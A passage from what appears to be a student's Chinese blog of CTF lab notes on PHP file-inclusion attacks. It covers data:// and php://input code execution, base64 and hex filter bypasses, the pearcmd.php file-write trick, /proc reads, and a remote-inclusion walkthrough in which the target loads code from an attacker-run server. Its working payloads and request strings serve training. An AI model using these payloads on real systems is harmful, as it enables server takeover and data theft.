<p>比如：正常执行代码需要 <code>include(&#39;1.php&#39;)</code>（1.php 里是 <code>phpinfo();</code>）；用 <code>data://</code> 可以直接 <code>include(&#39;data://text/plain,&lt;?php phpinfo();?&gt;&#39;)</code>—— 没有 1.php 文件，但效果一样。</p>
<h4 id="二、两种用法（通俗解释-示例）"><a href="#二、两种用法（通俗解释-示例）" class="headerlink" title="二、两种用法（通俗解释 + 示例）"></a><strong>二、两种用法（通俗解释 + 示例）</strong></h4><p><code>data://</code> 有两种常用格式，核心区别是 “数据是否 Base64 编码”，咱们逐个说：</p>
<h5 id="用法-1：明文格式（data-text-plain-代码）"><a href="#用法-1：明文格式（data-text-plain-代码）" class="headerlink" title="用法 1：明文格式（data:&#x2F;&#x2F;text&#x2F;plain,代码）"></a><strong>用法 1：明文格式（<strong><strong>data:&#x2F;&#x2F;text&#x2F;plain,代码</strong></strong>）</strong></h5><ul>
<li>格式：<code>data://text/plain,要执行的PHP代码</code></li>
<li>通俗说：“告诉 PHP，后面的内容是纯文本格式，直接执行里面的 PHP 代码”</li>
<li>示例：</li>
<li>php</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 开启两个必要开关（实际环境需要在php.ini里设置，这里是模拟）</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_include&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);<span class="comment">// 用include执行data://里的代码</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;data://text/plain,&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>执行结果：会输出 PHP 的环境信息（<code>phpinfo()</code> 的效果），相当于执行了一段 PHP 代码，却没创建任何文件。</li>
</ul>
<h5 id="用法-2：Base64-编码格式（推荐）（data-text-plain-base64-编码后的代码）"><a href="#用法-2：Base64-编码格式（推荐）（data-text-plain-base64-编码后的代码）" class="headerlink" title="用法 2：Base64 编码格式（推荐）（data:&#x2F;&#x2F;text&#x2F;plain;base64,编码后的代码）"></a><strong>用法 2：Base64 编码格式（推荐）（<strong><strong>data:&#x2F;&#x2F;text&#x2F;plain;base64,编码后的代码</strong></strong>）</strong></h5><ul>
<li><p>格式：<code>data://text/plain;base64,Base64编码后的PHP代码</code></p>
</li>
<li><p>通俗说：“先把 PHP 代码用 Base64 编码（变成一串字母数字），再告诉 PHP：先解码这段数据，再执行里面的代码”</p>
</li>
<li><p>示例：</p>
<ol>
<li>先把要执行的代码 <code>&lt;?php phpinfo();?&gt;</code> 做 Base64 编码（在线编码工具就能弄），编码结果是：<code>PD9waHAgcGhwaW5mbygpOz8+</code></li>
<li>用 <code>data://</code> 执行编码后的内容：</li>
<li>php</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  ```</span><br><span class="line"></span><br><span class="line">**<span class="meta">&lt;?php</span>**<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_include&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);<span class="comment">// 解码后执行：PD9waHAgcGhwaW5mbygpOz8+ → &lt;?php phpinfo();?&gt;include(&#x27;data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+&#x27;);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>执行结果：和明文格式一样，输出 <code>phpinfo()</code> 信息。</p>
</li>
</ul>
<h4 id="三、为什么推荐用-Base64-编码？（关键！）"><a href="#三、为什么推荐用-Base64-编码？（关键！）" class="headerlink" title="三、为什么推荐用 Base64 编码？（关键！）"></a><strong>三、为什么推荐用 Base64 编码？（关键！）</strong></h4><p>这是你最关心的点 —— 明文格式明明更简单，为啥非要 Base64 编码？核心原因是 <strong>“绕过过滤”</strong>，咱们结合漏洞题场景说：</p>
<h5 id="绕过-“特殊字符过滤”"><a href="#绕过-“特殊字符过滤”" class="headerlink" title="绕过 “特殊字符过滤”"></a>绕过 “特殊字符过滤”</h5><p>很多漏洞题会过滤 <code>&lt;?php</code>、<code>&gt;</code>、<code>;</code> 这些 PHP 代码特有的字符（比如过滤 <code>&lt;?</code> 变成空），此时明文格式会失效：</p>
<ul>
<li><p>比如题目过滤 <code>&lt;?</code>：明文 <code>data://text/plain,&lt;?php phpinfo();?&gt;</code> 会变成 <code>data://text/plain,php phpinfo();?&gt;</code>，执行失败；</p>
</li>
<li><p>但 Base64 编码后，代码变成 <code>PD9waHAgcGhwaW5mbygpOz8+</code>（全是字母数字，没有特殊字符），过滤函数找不到要替换的内容，直接放行 —— 解码后又能还原成原始代码，成功执行。</p>
</li>
</ul>
<h5 id="避免-“语法冲突”"><a href="#避免-“语法冲突”" class="headerlink" title="避免 “语法冲突”"></a>避免 “语法冲突”</h5><p>如果 <code>data://</code> 后面的代码包含逗号、空格、&amp; 等 URL 特殊字符，可能会被浏览器 &#x2F; 服务器解析错误（比如逗号会被当成参数分隔符）；Base64 编码后会把这些特殊字符转成安全的字母数字，避免冲突。</p>
<h5 id="漏洞题的-“常规操作”"><a href="#漏洞题的-“常规操作”" class="headerlink" title="漏洞题的 “常规操作”"></a>漏洞题的 “常规操作”</h5><p>漏洞题中，<code>data://</code> 几乎都是和 “文件包含漏洞” 结合的 —— 黑客想执行恶意代码，但服务器过滤了特殊字符，所以用 Base64 编码绕过，这是最稳妥、最常用的手段。</p>
<h4 id="四、实操示例：用-data-执行恶意代码（漏洞场景）"><a href="#四、实操示例：用-data-执行恶意代码（漏洞场景）" class="headerlink" title="四、实操示例：用 data:&#x2F;&#x2F; 执行恶意代码（漏洞场景）"></a><strong>四、实操示例：用 <strong><strong>data:&#x2F;&#x2F;</strong></strong> 执行恶意代码（漏洞场景）</strong></h4><p>假设题目有一个文件包含漏洞，代码如下（接收 <code>file</code> 参数，包含对应的文件）：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 题目开启了 allow_url_fopen 和 allow_url_include（漏洞前提）$file = $_GET[&#x27;file&#x27;];include($file); // 直接包含用户传入的file参数，存在漏洞?&gt;</span></span><br></pre></td></tr></table></figure>

<p>*<em>我们要执行 <strong><strong>system(‘cat flag.php’)</strong></strong>（读取 flag 文件），步骤如下：</em>*</p>
<ol>
<li>把恶意代码 <code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code> 做 Base64 编码，得到：<code>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></li>
<li>构造 <code>data://</code> 格式的 Payload，作为 <code>file</code> 参数传入：</li>
<li>plaintext</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标服务器/漏洞文件.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<ol>
<li>服务器执行流程：<ul>
<li>接收 <code>file</code> 参数：<code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></li>
<li><code>include()</code> 函数识别 <code>data://</code> 协议，按照规则解码 Base64 字符串；</li>
<li>解码后得到 <code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code>，并执行；</li>
<li>最终输出 <code>flag.php</code> 的内容，我们拿到 flag。</li>
</ul>
</li>
</ol>
<h4 id="五、关键补充（避坑-安全）"><a href="#五、关键补充（避坑-安全）" class="headerlink" title="五、关键补充（避坑 + 安全）"></a>五、关键补充（避坑 + 安全）</h4><ol>
<li><p><strong>必须开启两个开关</strong>：<code>allow_url_fopen=on</code> 和 <code>allow_url_include=on</code>—— 少一个都用不了（生产环境建议都设为 <code>off</code>，防止被黑客利用）；</p>
</li>
<li><p><strong>Base64 编码注意事项</strong>：</p>
<ul>
<li>编码的代码必须是 PHP 格式（比如开头 <code>&lt;?php</code>，结尾 <code>?&gt;</code>，或省略 <code>?&gt;</code>）；</li>
<li>编码时不要带多余空格 &#x2F; 换行，否则解码后会出错；</li>
<li>在线编码工具选 “UTF-8 无 BOM”，避免乱码。</li>
</ul>
</li>
<li><p><strong>和 <strong><strong>php:&#x2F;&#x2F;</strong></strong> 的区别</strong>：</p>
<ul>
<li><code>php://</code> 是 “访问 PHP 内置的输入输出流”（比如读 POST 原始数据）；</li>
<li><code>data://</code> 是 “把数据伪装成文件”（比如执行代码）；</li>
</ul>
</li>
<li><p><strong>安全风险</strong>：如果服务器开了两个开关，又有文件包含漏洞，黑客可以用 <code>data://</code> 执行任意 PHP 代码，控制服务器 —— 所以生产环境一定要禁用这两个开关（或严格过滤用户输入）。</p>
</li>
</ol>
<h4 id="总结（一句话记死）"><a href="#总结（一句话记死）" class="headerlink" title="总结（一句话记死）"></a>总结（一句话记死）</h4><p><code>data://</code> 是 “无文件执行 PHP 代码” 的工具，需要两个开关开启；推荐用 Base64 编码是为了绕过特殊字符过滤，核心用在文件包含漏洞场景，让黑客不用上传文件就能执行恶意代码。</p>
<p>这段内容讲的是 <strong>PHP 文件包含漏洞的 3 种高级绕过（bypass）技巧</strong>，核心场景是 “服务器不让直接执行恶意代码 &#x2F; 写文件，用这些方法绕开限制拿权限（getshell）”。咱们用 “大白话 + 场景拆解”，从 “是什么 → 怎么用 → 为什么有用” 讲透，完全不用怕看不懂：</p>
<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="先铺垫核心背景：什么是-“文件包含漏洞”？"><a href="#先铺垫核心背景：什么是-“文件包含漏洞”？" class="headerlink" title="先铺垫核心背景：什么是 “文件包含漏洞”？"></a>先铺垫核心背景：什么是 “文件包含漏洞”？</h4><p>简单说：如果 PHP 代码里有 <code>include($_GET[&#39;file&#39;])</code> 这种写法（直接包含用户传入的参数），黑客就能通过 <code>?file=恶意文件</code> 让服务器执行恶意代码 —— 这就是 “文件包含漏洞”。</p>
<p>但服务器通常会有防护（比如过滤 <code>php://</code>、<code>data://</code> 这些协议），所以下面 3 个技巧，都是 “防护绕过方案”，而且主要针对 <strong>Docker 环境的 PHP</strong>（因为 Docker 有一些默认特性可被利用）。</p>
<h4 id="一、pearcmd-php-利用：Docker-默认自带的-“写文件工具”"><a href="#一、pearcmd-php-利用：Docker-默认自带的-“写文件工具”" class="headerlink" title="一、pearcmd.php 利用：Docker 默认自带的 “写文件工具”"></a>一、pearcmd.php 利用：Docker 默认自带的 “写文件工具”</h4><p><strong>核心原理（一句话）</strong></p>
<p>Docker 里的 PHP 默认装了一个叫 <code>pearcmd.php</code> 的工具文件（路径固定：<code>/usr/local/lib/php/pearcmd.php</code>），这个文件有个隐藏功能：<strong>能接收参数，帮我们在服务器上写任意文件</strong>—— 不用自己上传，直接通过漏洞触发它写恶意 PHP 文件，再包含执行。</p>
<p><strong>为什么能用上？</strong></p>
<ul>
<li>Docker 特性：所有 Docker 的 PHP 镜像，默认都带了 <code>pearcmd.php</code>（相当于 “自带的后门工具”，不是漏洞，是正常工具被滥用）；</li>
<li>无需复杂操作：不用绕太多过滤，一个请求就能写文件，成功率高。</li>
</ul>
<p><strong>实操拆解（看那个数据包）</strong></p>
<p>黑客发送的请求：</p>
<p>plaintext</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>咱们翻译一下这个请求的意思：</p>
<ul>
<li><p>目标：服务器上有漏洞的文件 <code>index.php</code>（里面有 <code>include($_GET[&#39;file&#39;])</code>）；</p>
</li>
<li><p>核心操作：让 <code>index.php</code> 包含 <code>pearcmd.php</code>（通过 <code>&amp;file=/usr/local/lib/php/pearcmd.php</code>）；</p>
</li>
<li><p>关键参数：<code>+config-create+/</code> 是 <code>pearcmd.php</code> 的 “写文件命令”，后面跟着 3 个核心信息：</p>
<ol>
<li>要写的内容：<code>&lt;?=phpinfo()?&gt;</code>（恶意代码，执行后显示 PHP 信息）；</li>
<li>保存路径：<code>/tmp/hello.php</code>（服务器上的临时目录，Docker 里 <code>/tmp</code> 通常可写）；</li>
</ol>
</li>
</ul>
<p><strong>执行流程</strong></p>
<ol>
<li>黑客发上面的请求 → 服务器执行 <code>index.php</code>→ 包含 <code>pearcmd.php</code>；</li>
<li><code>pearcmd.php</code> 接收 <code>config-create</code> 命令，按照要求写文件：把 <code>&lt;?=phpinfo()?&gt;</code> 写入 <code>/tmp/hello.php</code>；</li>
<li>黑客再发一个请求：<code>/index.php?file=/tmp/hello.php</code>→ 服务器包含这个恶意文件，执行 <code>phpinfo()</code>，成功 getshell。</li>
</ol>
<p><strong>通俗类比</strong></p>
<p>相当于 Docker 的 PHP 服务器里，默认放了一把 “万能写文件的钥匙”（<code>pearcmd.php</code>），黑客通过漏洞拿到这把钥匙，让它帮自己写了一把 “后门钥匙”（<code>hello.php</code>），之后就能用后门钥匙随便操作服务器了。</p>
<h4 id="二、peclcmd-利用：和-pearcmd-类似的-“兄弟工具”"><a href="#二、peclcmd-利用：和-pearcmd-类似的-“兄弟工具”" class="headerlink" title="二、peclcmd 利用：和 pearcmd 类似的 “兄弟工具”"></a>二、peclcmd 利用：和 pearcmd 类似的 “兄弟工具”</h4><p><strong>核心原理</strong></p>
<p>和 <code>pearcmd.php</code> 几乎一样！是 Docker PHP 里默认带的另一个工具文件（<code>peclcmd.php</code>），也有 “接收参数写文件” 的功能。</p>
<p><strong>区别</strong></p>
<ul>
<li>适用场景：部分 Docker 镜像可能 <code>pearcmd.php</code> 被删，但 <code>peclcmd.php</code> 还在，相当于 “备用方案”；</li>
<li>用法：和 pearcmd 类似，只是命令参数、文件路径可能略有不同（比如命令不是 <code>config-create</code>，但核心是 “用工具写文件”）；</li>
<li>来源：题目里提到的 SEETF-2023 是 CTF 比赛题，本质就是用这个工具绕开了服务器的过滤。</li>
</ul>
<p><u>总结：pearcmd 和 peclcmd 就是 “Docker PHP 自带的两把写文件钥匙”，任选其一能用就好。</u></p>
<h4 id="三、-proc-目录利用：Linux-系统的-“进程信息宝库”（非预期绕过）"><a href="#三、-proc-目录利用：Linux-系统的-“进程信息宝库”（非预期绕过）" class="headerlink" title="三、&#x2F;proc 目录利用：Linux 系统的 “进程信息宝库”（非预期绕过）"></a>三、&#x2F;proc 目录利用：Linux 系统的 “进程信息宝库”（非预期绕过）</h4><p><strong>核心原理（一句话）</strong></p>
<p><code>/proc</code> 是 Linux 系统的 “虚拟文件系统”（数据存在内存里，不是硬盘），里面存着所有进程的秘密（比如进程执行的命令、打开的文件、环境变量）。如果服务器没过滤 <code>/proc</code>，黑客能通过它读取关键信息，绕开限制拿到恶意代码。</p>
<p><strong>为什么能用上？</strong></p>
<ul>
<li>无文件依赖：不用写文件、不用找工具，直接读系统自带的 “进程信息文件”；</li>
<li>非预期：很多出题人 &#x2F; 开发者会忽略 <code>/proc</code> 的风险，没过滤它，属于 “防不胜防” 的绕过。</li>
</ul>
<p><strong>重点理解几个关键的 &#x2F;proc 文件（黑客常用）</strong></p>
<p>先记住：<code>/proc/self/</code> 代表 “当前正在运行的进程”（也就是执行 PHP 脚本的进程），不用记复杂的进程号（PID），用 <code>self</code> 就行：</p>
<p><strong>实操场景（比如 CTF 题目里的用法）</strong></p>
<p>假设服务器过滤了 <code>php://</code>、<code>data://</code>，但没过滤 <code>/proc</code>，黑客可以：</p>
<ol>
<li>用 <code>/proc/self/cwd/flag.php</code> 直接包含网站根目录的 flag 文件（因为 <code>cwd</code> 指向网站目录）；</li>
<li>用 <code>/proc/self/fd/3</code> 读取服务器正在打开的某个敏感文件（比如 fd&#x2F;3 是配置文件，里面有后门）；</li>
<li>用 <code>/proc/self/environ</code> 读取环境变量里的 <code>FLAG</code> 字段（很多 CTF 题会把 flag 存在环境变量里）。</li>
</ol>
<p><strong>通俗类比</strong></p>
<p><code>/proc</code> 就像服务器的 “身份证 + 钥匙串”，里面记着自己的运行方式、藏东西的地方、甚至密码。黑客通过漏洞拿到这个 “身份证”，就能找到服务器的秘密，绕开防护直接拿权限。</p>
<h4 id="三个技巧的核心区别-适用场景"><a href="#三个技巧的核心区别-适用场景" class="headerlink" title="三个技巧的核心区别 &amp; 适用场景"></a>三个技巧的核心区别 &amp; 适用场景</h4><h4 id="总结（一句话记死）-1"><a href="#总结（一句话记死）-1" class="headerlink" title="总结（一句话记死）"></a>总结（一句话记死）</h4><p>这三个都是文件包含漏洞的 “高级绕法”：前两个靠 Docker PHP 自带的 “写文件工具” 偷偷写后门，后一个靠 Linux 的 “进程信息文件” 直接找秘密 —— 核心都是 “绕开服务器防护，不用正常上传 &#x2F; 执行，就能拿到权限”。</p>
<p>如果是 CTF 做题 &#x2F; 漏洞挖掘，优先试 pearcmd（成功率最高），不行再试 peclcmd，最后试 &#x2F;proc（看运气碰非预期）</p>
<h1 id="Week3-5-实验-PHP-文件包含-lab0-11-解题-补充知识"><a href="#Week3-5-实验-PHP-文件包含-lab0-11-解题-补充知识" class="headerlink" title="*[Week3.5]实验:PHP 文件包含 lab0-11 解题 补充知识"></a>*[Week3.5]实验:PHP 文件包含 lab0-11 解题 补充知识</h1><h3 id="RCE-括号绕过"><a href="#RCE-括号绕过" class="headerlink" title="RCE 括号绕过"></a>RCE 括号绕过</h3><p>若括号被过滤,可以使用反引号 &#96;&#96; 进行命令执行,但这个函数只有返回值,不会输出 要用 echo <code>指令</code> 来输出结果</p>
<h3 id="十六进制编码避免过滤-用于绕过命令中被过滤的字符"><a href="#十六进制编码避免过滤-用于绕过命令中被过滤的字符" class="headerlink" title="十六进制编码避免过滤(用于绕过命令中被过滤的字符)"></a>十六进制编码避免过滤(用于绕过命令中被过滤的字符)</h3><p>PHP 只有在解析 字符串字面量（用单引号 ‘、双引号 “、反引号 &#96; 包裹的内容）时，才会识别 \x 转义符。</p>
<p>这时候才可以用十六进制编码避免过滤.例如<?php echo ``\x6d\x6f\x72\x65\x20\x2f\x66\x6c\x61\x67``?> 注意里面有反引号</p>
<h3 id="远程文件包含-http-https-解题办法"><a href="#远程文件包含-http-https-解题办法" class="headerlink" title="远程文件包含(http&#x2F;https 解题办法)"></a><strong>远程文件包含(http&#x2F;https 解题办法)</strong></h3><p>题目:</p>
<?php

isset($_GET['wrappers']) ? include("http://".$_GET['wrappers']) : '';



highlight_file(__FILE__);



?>

<p>flag 在&#x2F;flag 里面</p>
<p><strong>本地搭临时服务器（最快，推荐）</strong></p>
<p>适合自己有电脑的情况，不用依赖外部服务器，3 步搞定：</p>
<p><strong>步骤 1：写一个 “读 flag 的 PHP 文件”</strong></p>
<p>新建一个文本文件，命名为 <code>flag.php</code>（名字随便取），内容写：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>** <span class="keyword">echo</span> `more /flag`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>原理：这个文件的作用是执行 <code>more /flag</code> 命令（读根目录 flag），并输出结果；</li>
</ul>
<p>备用命令：如果 <code>more</code> 被禁，换成 <code>less /flag</code>、<code>tail /flag</code>，代码改成 <code>&lt;?php echo </code> tail &#x2F;flag <code>; ?</code><strong>&gt;****。</strong></p>
<p><strong>步骤 2：本地搭临时 HTTP 服务器</strong></p>
<p>打开电脑的「终端 &#x2F; 命令提示符」，进入 <code>flag.php</code> 所在的文件夹，执行以下命令（PHP 自带临时服务器，不用装 Apache&#x2F;Nginx）：</p>
<ul>
<li>Windows&#x2F;Mac&#x2F;Linux 通用命令：</li>
<li>bash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8080</span><br></pre></td></tr></table></figure>

<ul>
<li>执行后会提示 <code>PHP 7.4.3 Development Server (``http://0.0.0.0:8080``) started</code>，说明服务器搭好了（端口 8080，可改成 80、8000 等没被占用的端口）。</li>
</ul>
<p><strong>步骤 3：找自己的公网 IP（让题目服务器能访问到）</strong></p>
<ul>
<li>百度搜索「我的公网 IP」，比如得到你的公网 IP 是 <code>123.45.67.89</code>；</li>
<li>此时你的 <code>flag.php</code> 对外访问地址是：<code>http://123.45.67.89:8080/flag.php</code>（如果改了端口，就把 8080 换成你的端口）。</li>
</ul>
<p><strong>步骤 4：构造 Payload 访问题目</strong></p>
<p>把上面的地址拼接到题目 URL 的 <code>wrappers</code> 参数里，最终 URL 是：</p>
<p>plaintext</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://题目地址/?wrappers=123.45.67.89:8080/flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>原理：题目服务器会 <code>include(&quot;http://123.45.67.89:8080/flag.php&quot;)</code>，加载你本地的 PHP 文件，执行 <code>more /flag</code> 并返回 flag！</li>
</ul>
<h3 id="1-2-返回-true-的方法"><a href="#1-2-返回-true-的方法" class="headerlink" title="1&#x3D;&#x3D;2 返回 true 的方法"></a><strong>1&#x3D;&#x3D;2 返回 true 的方法</strong></h3><p>利用以下两点:</p>
<p>1.PHP 比较「数组 vs 整数」时，不会报错，而是直接返回 <code>true</code>（这是 PHP 弱类型(强类型不适用)的经典特性，CTF 常考）。</p>
<p>2.PHP 可以直接给数字当变量赋一个数组,或者直接给数字当变量传另一个数字</p>
<p>这里直接 get 方式让 1&#x3D;2,或者 1[]&#x3D;任意值,甚至 1&#x3D;’2’都行</p>
<p><em>(注意:PHP 弱类型比较中，字符串</em>_’2’<strong>不会转成 ASCII 码（</strong>‘2’_<em>的 ASCII 码是 50），而是直接转成「对应的数字 2」)</em></p>
<h3 id="php-filter-直接读取文件"><a href="#php-filter-直接读取文件" class="headerlink" title="php:&#x2F;filter 直接读取文件"></a>php:&#x2F;filter 直接读取文件</h3><p>像这样 php:&#x2F;filter&#x2F;&#x2F;resource&#x3D;&#x2F;flag 不填加工规则直接读就行</p>
<h3 id="php-input-获取并执行-post-内容"><a href="#php-input-获取并执行-post-内容" class="headerlink" title="php:&#x2F;input 获取并执行 post 内容"></a>php:&#x2F;input 获取并执行 post 内容</h3><p><code>php://input</code> 是 PHP 的 “内置数据通道”，作用是：<strong>读取当前 HTTP 请求的「原始请求体内容」</strong>（请求体就是 POST 请求里存放数据的地方，比如表单提交的内容、我们传的 PHP 代码）。</p>
<p><code>include(&quot;php://input&quot;)</code> 等价于：<strong>“读取这次请求的 POST 请求体内容，把它当成 PHP 文件执行”</strong>。</p>
<p><em>注意这里 POST 请求体不能用 HackBar 写,要用 Burp 写.</em></p>
<p><strong>Burp 里写 POST 请求体 → 给服务器传 “恶意 PHP 代码”</strong></p>
<p>我们在 Burp 的 Repeater 里，给请求体写 <code>&lt;?php echo </code> more &#x2F;flag <code>; ?&gt;</code>，本质是：<strong>把 “读 flag 的命令” 包装成合法 PHP 代码，通过 POST 请求体传给服务器</strong>。</p>
<ul>
<li>服务器通过 <code>php://input</code> 读到这段代码后，<code>include</code> 会执行它；</li>
<li><code>echo ``more /flag</code> 是执行系统命令 <code>more /flag</code>（读根目录 flag 文件），并把结果输出 —— 服务器执行后，就会把 flag 返回给我们。</li>
</ul>
<h3 id="为什么说用-php-filter-读取-php-代码时，都会加「编码转换」（比如-Base64）"><a href="#为什么说用-php-filter-读取-php-代码时，都会加「编码转换」（比如-Base64）" class="headerlink" title="为什么说用 php://filter 读取 php 代码时，都会加「编码转换」（比如 Base64）?"></a>为什么说用 <code>php://filter</code> 读取 php 代码时，都会加「编码转换」（比如 Base64）?</h3><p>一句话解释，是因为避免源码被执行，直接拿到明文源码.</p>
<p>举个例子：</p>
<p>假设 <code>flag.php</code> 的内容是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>** </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;ctf_php_filter&#125;&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;欢迎访问&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果你用 <code>include(&quot;php://filter/resource=flag.php&quot;)</code>：服务器会读取 <code>flag.php</code> 的<strong>原始源码</strong>，并当作 PHP 代码执行 —— 但源码里的 <code>&lt;?php ... ?&gt;</code> 会被再次解析，<code>$flag</code> 变量会被定义，但依然不会输出（除非源码里有 <code>echo $flag</code>）.</p>
<p>但如果进行编码转换（比如 Base64），避免源码被执行，可直接拿到明文源码</p>
<h3 id="file-get-content-函数"><a href="#file-get-content-函数" class="headerlink" title="file_get_content()函数"></a>file_get_content()函数</h3><p>括号里面写文件路径 直接读取这个文件的内容(而不是执行源码等) 不输出 返回值是这个内容</p>
<p>如果读取失败会输出 false</p>
<h3 id="http-访问并执行-php-文件"><a href="#http-访问并执行-php-文件" class="headerlink" title="http 访问并执行 php 文件"></a><strong>http 访问并执行 php 文件</strong></h3><p>在网址后 +&#x2F;路径&#x2F;文件名.php，即可访问并执行这个 php 文件</p>
<h3 id="Level11-WP"><a href="#Level11-WP" class="headerlink" title="Level11 WP"></a>Level11 WP</h3><p>本题较为精彩，可运用到上述很多知识点，故展开说明一下</p>
<p><img src="/images/PpplbjAVToo1M9xDgWpcPL4znUc.png"></p>
<p>注意到本题是想让你用 file_put_contents 来创建一个名为 filename 的文件并写入 data 数据</p>
<p>这里要结合前一点所说 http 访问并执行 php 文件,我们先创建带有获取根目录下 flag 的值代码的</p>
<p>php 文件,再用 http 访问并执行.</p>
<p>我们先 get 一个文件名 m.php，这时候还没有写入代码</p>
<p><img src="/images/BjtwbI1zBo5naXxzTOTcEqGtnyc.png"></p>
<p><img src="/images/XKoMboBwJoEawvxxpjjc9fPcnYf.png"></p>
<p>再 post 要写入的代码 用反引号绕过括号，用单引号绕过 flag.</p>
<p>这时候应该很好的绕过了字符过滤，创建了一个名为 m 的 php 文件</p>
<p><img src="/images/WtaebpB8soBJ5ExqmTWcskYQnUc.png"></p>
<p>再用 http 访问并执行 这时候能执行 cat &#x2F;flag 从而拿到 flag.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/10/29/%E7%AC%AC%E4%BA%8C%E7%AB%A0-RCE%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/10/29/%E7%AC%AC%E4%BA%8C%E7%AB%A0-RCE%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="post-title-link" itemprop="url">第二章-RCE与正则表达式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-10-29 10:00:00" itemprop="dateCreated datePublished" datetime="2025-10-29T10:00:00+08:00">2025-10-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:40:16" itemprop="dateModified" datetime="2026-01-21T01:40:16+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="PHP-命令执行-续上周的学习"><a href="#PHP-命令执行-续上周的学习" class="headerlink" title="PHP 命令执行(续上周的学习)"></a><strong>PHP 命令执行(续上周的学习)</strong></h1><p><em><em>个人的所有作业中,带</em>的小点为做题补充知识点</em></p>
<p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/ItxLw7DWRiswQwkzPH8cNV83nbe?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/ItxLw7DWRiswQwkzPH8cNV83nbe?from=from_copylink</a></p>
